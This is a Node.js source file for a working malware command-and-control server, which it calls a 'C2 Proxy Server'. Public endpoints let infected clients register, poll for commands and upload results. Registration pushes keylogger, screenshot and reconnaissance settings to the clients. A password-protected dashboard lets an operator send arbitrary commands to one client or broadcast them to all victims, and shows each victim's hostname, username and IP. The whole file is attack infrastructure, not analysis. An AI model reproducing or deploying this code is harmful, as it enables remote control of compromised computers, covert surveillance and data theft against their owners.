import express from 'express';
import crypto from 'crypto';
import cors from 'cors';
import compression from 'compression';
import helmet from 'helmet';
import rateLimit from 'express-rate-limit';
import session from 'express-session';
import { WebSocketServer } from 'ws';
import http from 'http';

const PORT = process.env.PORT || 8080;
const ENCRYPTION_KEY = process.env.ENCRYPTION_KEY || crypto.randomBytes(32).toString('hex');
const ADMIN_USERNAME = process.env.ADMIN_USERNAME || 'admin';
const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || crypto.randomBytes(16).toString('hex');
const SESSION_SECRET = process.env.SESSION_SECRET || crypto.randomBytes(32).toString('hex');

console.log('🚀 Starting Advanced C2 Proxy Server...');
console.log(`🔑 Admin Password: ${ADMIN_PASSWORD}`);

const app = express();
const server = http.createServer(app);
const wss = new WebSocketServer({ server });

// ==================== MIDDLEWARE ====================
app.use(session({
    secret: SESSION_SECRET,
    resave: false,
    saveUninitialized: false,
    cookie: { maxAge: 24 * 60 * 60 * 1000 }
}));

app.use(helmet({ contentSecurityPolicy: false, crossOriginEmbedderPolicy: false }));
app.use(compression());
app.use(cors());
app.use(express.json({ limit: '100mb' }));
app.use(express.urlencoded({ extended: true, limit: '100mb' }));

const limiter = rateLimit({
    windowMs: 15 * 60 * 1000,
    max: 100,
    message: { error: 'Too many requests' }
});
app.use('/api/', limiter);

// ==================== STORAGE ====================
class StoreManager {
    constructor() {
        this.cache = new Map();
        this.dataFile = './data.json';
        this.loadFromDisk();
        setInterval(() => this.saveToDisk(), 60000);
    }

    loadFromDisk() {
        try {
            const fs = require('fs');
            if (fs.existsSync(this.dataFile)) {
                const data = JSON.parse(fs.readFileSync(this.dataFile, 'utf8'));
                for (const [key, value] of Object.entries(data)) {
                    this.cache.set(key, { value, timestamp: Date.now() });
                }
                console.log(`📂 Loaded ${this.cache.size} items from disk`);
            }
        } catch (err) {}
    }

    saveToDisk() {
        try {
            const fs = require('fs');
            const data = {};
            for (const [key, entry] of this.cache) {
                data[key] = entry.value;
            }
            fs.writeFileSync(this.dataFile, JSON.stringify(data, null, 2));
        } catch (err) {}
    }

    async set(key, value) {
        this.cache.set(key, { value, timestamp: Date.now() });
        return true;
    }

    async get(key) {
        const cached = this.cache.get(key);
        return cached ? cached.value : null;
    }

    async delete(key) {
        this.cache.delete(key);
        return true;
    }

    async list(pattern) {
        const keys = Array.from(this.cache.keys());
        if (pattern) {
            const regex = new RegExp(pattern.replace('*', '.*'));
            return keys.filter(k => regex.test(k));
        }
        return keys;
    }
}

const store = new StoreManager();

// ==================== CRYPTO ====================
class CryptoManager {
    constructor(key) {
        this.key = Buffer.from(key, 'utf8');
    }

    encrypt(data) {
        const iv = crypto.randomBytes(16);
        const cipher = crypto.createCipheriv('aes-256-gcm', this.key, iv);
        let encrypted = cipher.update(JSON.stringify(data), 'utf8', 'base64');
        encrypted += cipher.final('base64');
        const authTag = cipher.getAuthTag();
        return { iv: iv.toString('base64'), data: encrypted, authTag: authTag.toString('base64') };
    }

    decrypt(encryptedObj) {
        const iv = Buffer.from(encryptedObj.iv, 'base64');
        const authTag = Buffer.from(encryptedObj.authTag, 'base64');
        const decipher = crypto.createDecipheriv('aes-256-gcm', this.key, iv);
        decipher.setAuthTag(authTag);
        let decrypted = decipher.update(encryptedObj.data, 'base64', 'utf8');
        decrypted += decipher.final('utf8');
        return JSON.parse(decrypted);
    }

    generateToken() {
        return crypto.randomBytes(32).toString('hex');
    }
}

const cryptoManager = new CryptoManager(ENCRYPTION_KEY);

// ==================== AUTH ====================
async function authenticate(req, res, next) {
    if (req.session && req.session.isAuthenticated) {
        return next();
    }
    
    const authHeader = req.headers.authorization;
    if (authHeader && authHeader.startsWith('Bearer ')) {
        const token = authHeader.substring(7);
        const validTokens = await store.get('admin_tokens') || [];
        if (validTokens.includes(token)) {
            return next();
        }
    }
    
    res.status(401).json({ error: 'Unauthorized - Please login first' });
}

async function generateAdminToken() {
    const token = cryptoManager.generateToken();
    const tokens = await store.get('admin_tokens') || [];
    tokens.push(token);
    await store.set('admin_tokens', tokens);
    return token;
}

// ==================== CLIENT MANAGER ====================
class ClientManager {
    constructor(store) {
        this.store = store;
        this.clients = new Map();
        this.onlineThreshold = 300000;
    }

    async register(data) {
        const { clientId, hostname, username, ip } = data;
        const clientData = {
            clientId,
            hostname: hostname || 'unknown',
            username: username || 'unknown',
            ip: ip || 'unknown',
            registered: new Date().toISOString(),
            lastSeen: new Date().toISOString(),
            status: 'online'
        };
        await this.store.set(`client:${clientId}`, clientData);
        const clients = await this.store.get('clients') || [];
        if (!clients.includes(clientId)) {
            clients.push(clientId);
            await this.store.set('clients', clients);
        }
        console.log(`✅ Client registered: ${clientId} (${hostname}/${username})`);
        return clientData;
    }

    async heartbeat(clientId) {
        const client = await this.store.get(`client:${clientId}`);
        if (!client) return null;
        client.lastSeen = new Date().toISOString();
        client.status = 'online';
        await this.store.set(`client:${clientId}`, client);
        this.clients.set(clientId, client);
        return client;
    }

    async getPendingCommands(clientId) {
        return await this.store.get(`pending:${clientId}`) || [];
    }

    async getStats() {
        const clients = await this.store.get('clients') || [];
        const stats = { total: clients.length, online: 0, offline: 0 };
        const now = Date.now();
        for (const id of clients) {
            const client = await this.store.get(`client:${id}`);
            if (client) {
                const lastSeen = new Date(client.lastSeen).getTime();
                if (now - lastSeen < this.onlineThreshold) stats.online++;
                else stats.offline++;
            }
        }
        return stats;
    }
}

const clientManager = new ClientManager(store);

// ==================== ANALYTICS ====================
class AnalyticsEngine {
    constructor(store) {
        this.store = store;
    }

    async log(eventType, data) {
        const event = {
            id: Date.now().toString() + '-' + crypto.randomBytes(4).toString('hex'),
            type: eventType,
            data,
            timestamp: new Date().toISOString()
        };
        const key = `event:${event.id}`;
        await this.store.set(key, event);
        const events = await this.store.get('events') || [];
        events.push(key);
        if (events.length > 10000) {
            const old = events.shift();
            await this.store.delete(old);
        }
        await this.store.set('events', events);
        return event;
    }
}

const analytics = new AnalyticsEngine(store);

// ==================== ✅ PUBLIC API ENDPOINTS (No Auth Required) ====================

// Health Check
app.get('/health', (req, res) => {
    res.json({ 
        status: 'online', 
        time: new Date().toISOString(),
        version: '3.0.0',
        clients: clientManager.clients.size,
        uptime: process.uptime(),
        platform: 'Render.com'
    });
});

// Root
app.get('/', (req, res) => {
    res.json({
        name: 'C2 Proxy Server',
        version: '3.0.0',
        status: 'running',
        endpoints: {
            health: '/health',
            dashboard: '/dashboard',
            register: 'POST /api/register (PUBLIC)',
            poll: 'POST /api/poll (PUBLIC)',
            results: 'POST /api/results (PUBLIC)',
            heartbeat: 'POST /api/heartbeat (PUBLIC)',
            admin: '/api/admin/* (Requires Auth)'
        }
    });
});

// ✅ PUBLIC: Register Client (NO AUTH REQUIRED)
app.post('/api/register', async (req, res) => {
    try {
        const { clientId, hostname, username, ip } = req.body;
        if (!clientId) {
            return res.status(400).json({ error: 'clientId required' });
        }
        
        const clientData = await clientManager.register({ clientId, hostname, username, ip });
        const commands = await clientManager.getPendingCommands(clientId);
        await store.delete(`pending:${clientId}`);
        
        const response = cryptoManager.encrypt({
            status: 'registered',
            clientId,
            commands,
            config: {
                pollingInterval: 2000,
                heartbeatInterval: 300000,
                keyloggerEnabled: true,
                screenshotEnabled: true,
                reconEnabled: true
            }
        });
        
        await analytics.log('client_registered', { clientId, hostname, username, ip });
        res.json(response);
    } catch (err) {
        console.error('Registration error:', err);
        res.status(500).json({ error: err.message });
    }
});

// ✅ PUBLIC: Poll for Commands (NO AUTH REQUIRED)
app.post('/api/poll', async (req, res) => {
    try {
        const { clientId, encryptedData } = req.body;
        if (!clientId) {
            return res.status(400).json({ error: 'clientId required' });
        }
        
        let data;
        try {
            data = cryptoManager.decrypt(encryptedData);
        } catch (e) {
            data = req.body;
        }
        
        await clientManager.heartbeat(clientId);
        const commands = await clientManager.getPendingCommands(clientId);
        await store.delete(`pending:${clientId}`);
        await analytics.log('poll', { clientId, commandCount: commands.length });
        
        const response = cryptoManager.encrypt({
            status: 'success',
            commands
        });
        
        res.json(response);
    } catch (err) {
        console.error('Poll error:', err);
        res.status(500).json({ error: err.message });
    }
});

// ✅ PUBLIC: Send Results (NO AUTH REQUIRED)
app.post('/api/results', async (req, res) => {
    try {
        const { clientId, encryptedData } = req.body;
        if (!clientId) {
            return res.status(400).json({ error: 'clientId required' });
        }
        
        let data;
        try {
            data = cryptoManager.decrypt(encryptedData);
        } catch (e) {
            data = req.body;
        }
        
        const { commandId, output, status } = data;
        const resultKey = `result:${clientId}:${commandId || Date.now()}`;
        const resultData = {
            clientId,
            commandId: commandId || Date.now(),
            output,
            status: status || 'completed',
            timestamp: new Date().toISOString()
        };
        
        await store.set(resultKey, resultData);
        const results = await store.get(`results:${clientId}`) || [];
        results.push(resultKey);
        if (results.length > 100) {
            const old = results.shift();
            await store.delete(old);
        }
        await store.set(`results:${clientId}`, results);
        
        await analytics.log('command_result', { clientId, commandId, status });
        const response = cryptoManager.encrypt({
            status: 'success',
            message: 'Results stored'
        });
        res.json(response);
    } catch (err) {
        console.error('Results error:', err);
        res.status(500).json({ error: err.message });
    }
});

// ✅ PUBLIC: Heartbeat (NO AUTH REQUIRED)
app.post('/api/heartbeat', async (req, res) => {
    try {
        const { clientId } = req.body;
        if (!clientId) {
            return res.status(400).json({ error: 'clientId required' });
        }
        await clientManager.heartbeat(clientId);
        await analytics.log('heartbeat', { clientId });
        res.json({ status: 'success' });
    } catch (err) {
        console.error('Heartbeat error:', err);
        res.status(500).json({ error: err.message });
    }
});

// ==================== ADMIN API (Protected) ====================

// Admin Login
app.post('/api/admin/login', async (req, res) => {
    try {
        const { username, password } = req.body;
        if (username === ADMIN_USERNAME && password === ADMIN_PASSWORD) {
            const token = await generateAdminToken();
            res.json({ status: 'success', token, expiresIn: 86400 });
        } else {
            res.status(401).json({ error: 'Invalid credentials' });
        }
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

// Admin Logout
app.post('/api/admin/logout', authenticate, async (req, res) => {
    req.session.destroy();
    res.json({ status: 'success', message: 'Logged out' });
});

// Get all clients (Protected)
app.get('/api/admin/clients', authenticate, async (req, res) => {
    try {
        const clients = await store.get('clients') || [];
        const clientData = [];
        for (const id of clients) {
            const data = await store.get(`client:${id}`);
            if (data) {
                const pending = await store.get(`pending:${id}`) || [];
                const results = await store.get(`results:${id}`) || [];
                data.pendingCommands = pending.length;
                data.resultsCount = results.length;
                clientData.push(data);
            }
        }
        clientData.sort((a, b) => new Date(b.lastSeen) - new Date(a.lastSeen));
        res.json({ clients: clientData });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

// Get client details (Protected)
app.get('/api/admin/clients/:clientId', authenticate, async (req, res) => {
    try {
        const { clientId } = req.params;
        const client = await store.get(`client:${clientId}`);
        if (!client) {
            return res.status(404).json({ error: 'Client not found' });
        }
        
        const pending = await store.get(`pending:${clientId}`) || [];
        const results = await store.get(`results:${clientId}`) || [];
        const history = await store.get(`history:${clientId}`) || [];
        
        const fullResults = [];
        for (const key of results.slice(-20)) {
            const result = await store.get(key);
            if (result) {
                fullResults.push(result);
            }
        }
        
        res.json({
            client,
            pending: pending.length,
            results: fullResults,
            history: history.slice(-20)
        });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

// Send command to client (Protected)
app.post('/api/admin/command', authenticate, async (req, res) => {
    try {
        const { clientId, command } = req.body;
        if (!clientId || !command) {
            return res.status(400).json({ error: 'clientId and command required' });
        }
        
        const commandId = Date.now().toString();
        const commandEntry = {
            id: commandId,
            command,
            timestamp: new Date().toISOString(),
            status: 'pending'
        };
        
        const pendingCommands = await store.get(`pending:${clientId}`) || [];
        pendingCommands.push(commandEntry);
        await store.set(`pending:${clientId}`, pendingCommands);
        
        await analytics.log('command_sent', { clientId, commandId, command });
        res.json({ status: 'success', commandId });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

// Broadcast command to all clients (Protected)
app.post('/api/admin/broadcast', authenticate, async (req, res) => {
    try {
        const { command } = req.body;
        if (!command) {
            return res.status(400).json({ error: 'command required' });
        }
        
        const clients = await store.get('clients') || [];
        const results = [];
        for (const clientId of clients) {
            const commandId = Date.now().toString() + '-' + crypto.randomBytes(4).toString('hex');
            const commandEntry = {
                id: commandId,
                command,
                timestamp: new Date().toISOString(),
                status: 'pending'
            };
            
            const pendingCommands = await store.get(`pending:${clientId}`) || [];
            pendingCommands.push(commandEntry);
            await store.set(`pending:${clientId}`, pendingCommands);
            results.push({ clientId, commandId });
        }
        
        await analytics.log('broadcast', { command, clientCount: clients.length });
        res.json({ status: 'success', broadcasted: results.length, clients: results });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

// Get results for client (Protected)
app.get('/api/admin/results/:clientId', authenticate, async (req, res) => {
    try {
        const { clientId } = req.params;
        const { limit = 50, offset = 0 } = req.query;
        
        const resultKeys = await store.get(`results:${clientId}`) || [];
        const results = [];
        
        const start = resultKeys.length - parseInt(limit) - parseInt(offset);
        const end = resultKeys.length - parseInt(offset);
        
        for (let i = start; i < end && i >= 0; i++) {
            const data = await store.get(resultKeys[i]);
            if (data) {
                results.push(data);
            }
        }
        
        res.json({ results: results.reverse(), total: resultKeys.length });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

// Delete client (Protected)
app.delete('/api/admin/clients/:clientId', authenticate, async (req, res) => {
    try {
        const { clientId } = req.params;
        const clients = await store.get('clients') || [];
        const index = clients.indexOf(clientId);
        if (index > -1) {
            clients.splice(index, 1);
            await store.set('clients', clients);
        }
        
        await store.delete(`client:${clientId}`);
        await store.delete(`pending:${clientId}`);
        await store.delete(`history:${clientId}`);
        await store.delete(`results:${clientId}`);
        
        await analytics.log('client_deleted', { clientId });
        res.json({ status: 'success', message: 'Client deleted' });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

// Analytics (Protected)
app.get('/api/admin/analytics', authenticate, async (req, res) => {
    try {
        const { range = '24h' } = req.query;
        const stats = await clientManager.getStats();
        res.json({ stats, timestamp: new Date().toISOString() });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

// ==================== DASHBOARD ====================

app.get('/dashboard', (req, res) => {
    // Check if logged in via session
    if (req.session && req.session.isAuthenticated) {
        return res.send(getDashboardHTML(req.session.username || 'admin'));
    }
    
    // If not logged in, redirect to login
    res.redirect('/login');
});

// Login page
app.get('/login', (req, res) => {
    if (req.session && req.session.isAuthenticated) {
        return res.redirect('/dashboard');
    }
    
    res.send(`
<!DOCTYPE html>
<html>
<head>
    <title>Login - C2 Proxy</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #0a0e17 0%, #1a2535 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .login-container {
            background: #141d2b;
            border-radius: 15px;
            padding: 40px;
            width: 100%;
            max-width: 400px;
            border: 1px solid #1e2d3d;
            box-shadow: 0 20px 60px rgba(0,0,0,0.5);
        }
        .login-header { text-align: center; margin-bottom: 30px; }
        .login-header h1 { color: #00ff88; font-size: 24px; }
        .login-header p { color: #8899aa; font-size: 14px; margin-top: 5px; }
        .form-group { margin-bottom: 20px; }
        .form-group label { display: block; color: #e0e0e0; font-size: 14px; margin-bottom: 5px; }
        .form-group input {
            width: 100%;
            padding: 12px 15px;
            background: #0a0e17;
            border: 1px solid #1e2d3d;
            border-radius: 8px;
            color: #e0e0e0;
            font-size: 14px;
        }
        .form-group input:focus {
            outline: none;
            border-color: #00ff88;
        }
        .login-btn {
            width: 100%;
            padding: 12px;
            background: #00ff88;
            color: #0a0e17;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s;
        }
        .login-btn:hover { background: #00cc66; }
        .error-message {
            background: #ff444422;
            color: #ff4444;
            padding: 10px 15px;
            border-radius: 8px;
            margin-bottom: 15px;
            display: none;
            border-left: 3px solid #ff4444;
        }
        .status-indicator {
            display: flex;
            align-items: center;
            justify-content: center;
            margin-top: 15px;
            padding: 10px;
            background: #0a0e17;
            border-radius: 8px;
        }
        .status-dot { width: 8px; height: 8px; border-radius: 50%; background: #00ff88; animation: pulse 2s infinite; }
        @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.5; } 100% { opacity: 1; } }
        .status-text { color: #8899aa; font-size: 12px; margin-left: 10px; }
    </style>
</head>
<body>
    <div class="login-container">
        <div class="login-header">
            <h1>🎯 C2 Proxy</h1>
            <p>Secure Access Required</p>
        </div>

        <div id="errorMessage" class="error-message"></div>

        <form id="loginForm" onsubmit="handleLogin(event)">
            <div class="form-group">
                <label for="username">Username</label>
                <input type="text" id="username" placeholder="Enter username" required>
            </div>
            <div class="form-group">
                <label for="password">Password</label>
                <input type="password" id="password" placeholder="Enter password" required>
            </div>
            <button type="submit" class="login-btn">🔐 Login</button>
        </form>

        <div class="status-indicator">
            <span class="status-dot"></span>
            <span class="status-text">System Online</span>
        </div>
    </div>

    <script>
        async function handleLogin(event) {
            event.preventDefault();
            
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            const errorMessage = document.getElementById('errorMessage');
            const loginBtn = document.querySelector('.login-btn');
            
            errorMessage.style.display = 'none';
            loginBtn.disabled = true;
            loginBtn.textContent = '⏳ Logging in...';
            
            try {
                const response = await fetch('/api/admin/login', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ username, password })
                });
                
                const data = await response.json();
                
                if (response.ok && data.status === 'success') {
                    window.location.href = '/dashboard';
                } else {
                    errorMessage.textContent = '❌ ' + (data.error || 'Invalid credentials');
                    errorMessage.style.display = 'block';
                    loginBtn.disabled = false;
                    loginBtn.textContent = '🔐 Login';
                    document.getElementById('password').value = '';
                }
            } catch (error) {
                errorMessage.textContent = '❌ Connection error. Please try again.';
                errorMessage.style.display = 'block';
                loginBtn.disabled = false;
                loginBtn.textContent = '🔐 Login';
            }
        }
    </script>
</body>
</html>
    `);
});

function getDashboardHTML(username) {
    return `
<!DOCTYPE html>
<html>
<head>
    <title>C2 Proxy Dashboard</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Segoe UI', sans-serif; background: #0a0e17; color: #e0e0e0; padding: 20px; }
        .container { max-width: 1200px; margin: 0 auto; }
        .header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; flex-wrap: wrap; gap: 10px; }
        h1 { color: #00ff88; border-bottom: 2px solid #00ff88; padding-bottom: 10px; }
        .card { background: #141d2b; border-radius: 10px; padding: 20px; margin: 20px 0; border: 1px solid #1e2d3d; }
        .card h2 { color: #00ff88; margin-bottom: 15px; }
        .client-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(250px, 1fr)); gap: 15px; }
        .client-card { background: #1a2535; padding: 15px; border-radius: 8px; border-left: 3px solid #00ff88; }
        .client-card .id { color: #00ff88; font-weight: bold; }
        .client-card .detail { color: #8899aa; font-size: 0.9em; }
        .status { display: inline-block; padding: 2px 8px; border-radius: 4px; font-size: 0.8em; }
        .status.online { background: #00ff8822; color: #00ff88; }
        .status.offline { background: #ff444422; color: #ff4444; }
        .flex { display: flex; gap: 10px; flex-wrap: wrap; }
        .flex > * { flex: 1; min-width: 200px; }
        input { background: #0a0e17; color: #e0e0e0; border: 1px solid #1e2d3d; padding: 10px; border-radius: 5px; width: 100%; }
        button { background: #00ff88; color: #0a0e17; border: none; padding: 10px 20px; border-radius: 5px; cursor: pointer; font-weight: bold; }
        button:hover { background: #00cc66; }
        .logout-btn { background: #ff4444; color: white; }
        .logout-btn:hover { background: #cc0000; }
        .stats-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(150px, 1fr)); gap: 15px; margin-bottom: 20px; }
        .stat-card { background: #1a2535; padding: 15px; border-radius: 8px; text-align: center; }
        .stat-card .number { font-size: 28px; font-weight: bold; color: #00ff88; }
        .stat-card .label { color: #8899aa; font-size: 12px; text-transform: uppercase; }
        .output { background: #0a0e17; padding: 15px; border-radius: 5px; font-family: monospace; white-space: pre-wrap; max-height: 300px; overflow-y: auto; }
    </style>
</head>
<body>
<div class="container">
    <div class="header">
        <h1>🎯 C2 Proxy Dashboard</h1>
        <div>
            <span style="color: #8899aa;">👤 ${username}</span>
            <button class="logout-btn" onclick="logout()">🚪 Logout</button>
        </div>
    </div>
    
    <div class="card">
        <h2>📊 Statistics</h2>
        <div class="stats-grid" id="stats">
            <div class="stat-card"><div class="number" id="total">0</div><div class="label">Total Clients</div></div>
            <div class="stat-card"><div class="number" id="online">0</div><div class="label">Online</div></div>
            <div class="stat-card"><div class="number" id="offline">0</div><div class="label">Offline</div></div>
        </div>
        <button onclick="loadClients()">🔄 Refresh</button>
    </div>
    
    <div class="card">
        <h2>🖥️ Connected Clients</h2>
        <div id="clients" class="client-grid">Loading...</div>
    </div>
    
    <div class="card">
        <h2>📤 Send Command</h2>
        <div class="flex">
            <input type="text" id="clientId" placeholder="Client ID">
            <input type="text" id="command" placeholder="Command">
            <button onclick="sendCommand()">▶ Execute</button>
            <button onclick="broadcastCommand()" style="background: #ff8800;">📢 Broadcast</button>
        </div>
        <div id="result" style="margin-top: 10px;"></div>
    </div>
    
    <div class="card">
        <h2>📋 Command Output</h2>
        <div id="output" class="output">Select a client to view results...</div>
    </div>
</div>

<script>
    let token = localStorage.getItem('token');
    
    function getHeaders() {
        return {
            'Content-Type': 'application/json',
            'Authorization': 'Bearer ' + token
        };
    }
    
    function logout() {
        localStorage.removeItem('token');
        window.location.href = '/login';
    }
    
    function loadClients() {
        const grid = document.getElementById('clients');
        grid.innerHTML = '⏳ Loading...';
        
        fetch('/api/admin/clients', { headers: getHeaders() })
            .then(res => {
                if (res.status === 401) {
                    window.location.href = '/login';
                    return;
                }
                return res.json();
            })
            .then(data => {
                if (!data) return;
                if (data.error) {
                    grid.innerHTML = '❌ ' + data.error;
                    return;
                }
                
                if (!data.clients || data.clients.length === 0) {
                    grid.innerHTML = 'No clients connected yet.';
                    document.getElementById('total').textContent = 0;
                    document.getElementById('online').textContent = 0;
                    document.getElementById('offline').textContent = 0;
                    return;
                }
                
                let online = 0;
                let offline = 0;
                grid.innerHTML = '';
                data.clients.forEach(client => {
                    const lastSeen = new Date(client.lastSeen);
                    const isOnline = (Date.now() - lastSeen.getTime()) < 300000;
                    if (isOnline) online++; else offline++;
                    
                    const card = document.createElement('div');
                    card.className = 'client-card';
                    card.innerHTML = \`
                        <div class="id">\${client.clientId}</div>
                        <div class="detail">💻 \${client.hostname}</div>
                        <div class="detail">👤 \${client.username}</div>
                        <div class="detail">📡 \${client.ip || 'unknown'}</div>
                        <div class="detail">🕐 Last seen: \${lastSeen.toLocaleString()}</div>
                        <span class="status \${isOnline ? 'online' : 'offline'}">\${isOnline ? '🟢 Online' : '🔴 Offline'}</span>
                    \`;
                    card.onclick = () => {
                        document.getElementById('clientId').value = client.clientId;
                        loadResults(client.clientId);
                    };
                    grid.appendChild(card);
                });
                
                document.getElementById('total').textContent = data.clients.length;
                document.getElementById('online').textContent = online;
                document.getElementById('offline').textContent = offline;
            })
            .catch(err => {
                grid.innerHTML = '❌ Error: ' + err.message;
            });
    }
    
    function sendCommand() {
        const clientId = document.getElementById('clientId').value.trim();
        const command = document.getElementById('command').value.trim();
        
        if (!clientId || !command) {
            alert('Enter both Client ID and Command');
            return;
        }
        
        document.getElementById('result').innerHTML = '⏳ Sending...';
        
        fetch('/api/admin/command', {
            method: 'POST',
            headers: getHeaders(),
            body: JSON.stringify({ clientId, command })
        })
        .then(res => {
            if (res.status === 401) { window.location.href = '/login'; return; }
            return res.json();
        })
        .then(data => {
            if (!data) return;
            if (data.error) {
                document.getElementById('result').innerHTML = '❌ ' + data.error;
            } else {
                document.getElementById('result').innerHTML = '✅ Command sent! ID: ' + data.commandId;
                document.getElementById('command').value = '';
                setTimeout(() => loadResults(clientId), 3000);
            }
        })
        .catch(err => {
            document.getElementById('result').innerHTML = '❌ Error: ' + err.message;
        });
    }
    
    function broadcastCommand() {
        const command = document.getElementById('command').value.trim();
        if (!command) {
            alert('Enter a command');
            return;
        }
        if (!confirm('Send this command to ALL clients?')) return;
        
        document.getElementById('result').innerHTML = '⏳ Broadcasting...';
        
        fetch('/api/admin/broadcast', {
            method: 'POST',
            headers: getHeaders(),
            body: JSON.stringify({ command })
        })
        .then(res => {
            if (res.status === 401) { window.location.href = '/login'; return; }
            return res.json();
        })
        .then(data => {
            if (!data) return;
            if (data.error) {
                document.getElementById('result').innerHTML = '❌ ' + data.error;
            } else {
                document.getElementById('result').innerHTML = '✅ Broadcasted to ' + data.broadcasted + ' clients';
            }
        })
        .catch(err => {
            document.getElementById('result').innerHTML = '❌ Error: ' + err.message;
        });
    }
    
    function loadResults(clientId) {
        const outputEl = document.getElementById('output');
        outputEl.innerHTML = '⏳ Loading results...';
        
        fetch('/api/admin/results/' + clientId, { headers: getHeaders() })
            .then(res => {
                if (res.status === 401) { window.location.href = '/login'; return; }
                return res.json();
            })
            .then(data => {
                if (!data) return;
                if (data.error) {
                    outputEl.innerHTML = '❌ ' + data.error;
                    return;
                }
                if (!data.results || data.results.length === 0) {
                    outputEl.innerHTML = 'No results for this client.';
                    return;
                }
                let html = '';
                data.results.slice().reverse().forEach(result => {
                    html += '[' + result.timestamp + '] ' + (result.commandId || 'unknown') + '\n';
                    html += (result.output || 'No output') + '\n';
                    html += '─'.repeat(60) + '\n\n';
                });
                outputEl.innerHTML = html;
            })
            .catch(err => {
                outputEl.innerHTML = '❌ Error: ' + err.message;
            });
    }
    
    // Auto-refresh
    loadClients();
    setInterval(loadClients, 30000);
</script>
</body>
</html>
    `;
}

// ==================== WEBSOCKET ====================
wss.on('connection', (ws) => {
    console.log('🔌 WebSocket connected');
    ws.on('close', () => console.log('🔌 WebSocket disconnected'));
});

// ==================== START ====================
server.listen(PORT, '0.0.0.0', () => {
    console.log(`🚀 C2 Proxy Server running on port ${PORT}`);
    console.log(`📊 Dashboard: http://localhost:${PORT}/dashboard`);
    console.log(`🔑 Admin Password: ${ADMIN_PASSWORD}`);
    console.log('');
    console.log('📡 Public endpoints (No Auth):');
    console.log('   POST /api/register');
    console.log('   POST /api/poll');
    console.log('   POST /api/results');
    console.log('   POST /api/heartbeat');
    console.log('');
    console.log('🔒 Protected endpoints (Auth required):');
    console.log('   GET  /api/admin/clients');
    console.log('   POST /api/admin/command');
    console.log('   GET  /api/admin/results/:clientId');
});

process.on('uncaughtException', (err) => console.error('❌ Error:', err.message));
